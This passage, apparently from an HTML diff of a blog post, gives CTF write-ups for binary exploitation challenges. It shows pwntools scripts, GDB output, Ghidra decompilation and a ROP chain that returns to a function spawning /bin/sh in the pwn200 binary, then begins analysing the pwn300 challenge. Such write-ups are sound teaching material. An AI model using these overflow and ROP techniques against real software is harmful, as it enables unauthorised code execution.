+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CCCCCCCC&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DDDDDDDD&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see from GDB below, not only was I able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;RIP&lt;/code&gt; with this script, but this time, I was also able to write more data to the stack. This means that ROP chains can be used for this attack.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0x15
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x00007f08250e7ed3  →  0x5577fffff0003d48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;H=&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x00007ffe92638b18  →  &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBBCCCCCCCCDDDDDDDD&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x4141414141414141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x00007f08251b8723  →  0x1ba670000000000a
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x00007f08251ba670  →  0x0000000000000000
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x0000000000400981  →  &amp;lt;add_cereal+162&amp;gt; ret
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0x15
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x00007ffe92638c10  →  &lt;span class=&quot;s2&quot;&gt;&quot;Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x1b
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x246
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0000000000400750  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ZERO carry PARITY adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x0033 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x002b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffe92638b18│+0x0000: &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBBCCCCCCCCDDDDDDDD&quot;&lt;/span&gt;   ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+0x00007ffe92638b20│+0x0008: &lt;span class=&quot;s2&quot;&gt;&quot;CCCCCCCCDDDDDDDD&quot;&lt;/span&gt;
+0x00007ffe92638b28│+0x0010: &lt;span class=&quot;s2&quot;&gt;&quot;DDDDDDDD&quot;&lt;/span&gt;
+0x00007ffe92638b30│+0x0018: 0x000000006c770000
+0x00007ffe92638b38│+0x0020: 0x35ca06701eb30600
+0x00007ffe92638b40│+0x0028: 0x00007f08251b7980  →  0x00000000fbad2088
+0x00007ffe92638b48│+0x0030: 0x00007f08251b94a0  →  0x0000000000000000
+0x00007ffe92638b50│+0x0038: 0x0000000000400750  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40097a &amp;lt;add_cereal+155&amp;gt; call   0x4006b0 &amp;lt;puts@plt&amp;gt;
+     0x40097f &amp;lt;add_cereal+160&amp;gt; nop
+     0x400980 &amp;lt;add_cereal+161&amp;gt; leave
+ →   0x400981 &amp;lt;add_cereal+162&amp;gt; ret
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;pwn200&quot;, stopped, reason: SIGSEGV&lt;/span&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x400981 → add_cereal()&lt;/span&gt;
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7ffe92638b18:
+ rip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x400981 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;add_cereal&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; saved rip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x4242424242424242
+ called by frame at 0x7ffe92638b28
+ Arglist at 0x4141414141414141, args:
+ Locals at 0x4141414141414141, Previous frame&lt;span class=&quot;s1&quot;&gt;'s sp is 0x7ffe92638b20
+ Saved registers:
+  rip at 0x7ffe92638b18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I took a look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;custom_feature&lt;/code&gt; function inside of Ghidra’s decompiler, and unlike in the previous binary, this function will only produce a shell if the first parameter is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x21524111&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;custom_feature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21524111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you are not authenticated to do this :&amp;lt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In order to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;custom_feature&lt;/code&gt; function, I had to create a ROP chain that moves &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; into RDI before calling &lt;code class=&quot;highlighter-rouge&quot;&gt;custom_feature&lt;/code&gt;. To do this, I searched for a POP RDI instruction.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; pwn200 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pop rdi&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop rdi
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: pwn200
+0x0000000000400be3: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After that, I looked up the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;custom_feature&lt;/code&gt; function.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  info functions custom_feature
+All functions matching regular expression &lt;span class=&quot;s2&quot;&gt;&quot;custom_feature&quot;&lt;/span&gt;:
+
+Non-debugging symbols:
+0x0000000000400837  custom_feature
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now it’s easy to construct a proper ROP chain using the Python code from earlier. Running the code below will give you a shell.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn200&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400be3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# POP RDI
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400837&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# custom_feature()
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;name-tracker&quot;&gt;Name Tracker&lt;/h3&gt;
+&lt;p&gt;You can download the binary &lt;a href=&quot;../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn300&quot;&gt;here&lt;/a&gt; and the library &lt;a href=&quot;../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/libc-2.31.so&quot;&gt;here&lt;/a&gt;. This binary was a little bit tougher than the other two, even though it was worth the same amount of points. The program maintains an array of strings, and it allows you to input values into this array. The user can specify the index in the array where he/she wants to save the string.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwn300
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;1
+index: 0
+pls give the name:
+AAAAAAAAAAAAAAAAAAAAAA
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;2
+index: 0
+AAAAAAAAAAAAAAAAAAAAAA
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When decompiling this program inside of Ghidra, you can see that the &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function first sets a function pointer to be equal to a pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;puts()&lt;/code&gt;. This function pointer is placed right at the very end of the &lt;code class=&quot;highlighter-rouge&quot;&gt;names&lt;/code&gt; array, which is supposed to contain all of the user’s input values.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_10000_8_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;do_main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This function pointer is later used by the &lt;code class=&quot;highlighter-rouge&quot;&gt;print_name()&lt;/code&gt; function, whose decompilation is shown below.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_00400a95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_10000_8_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index out of bounds no hacking&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
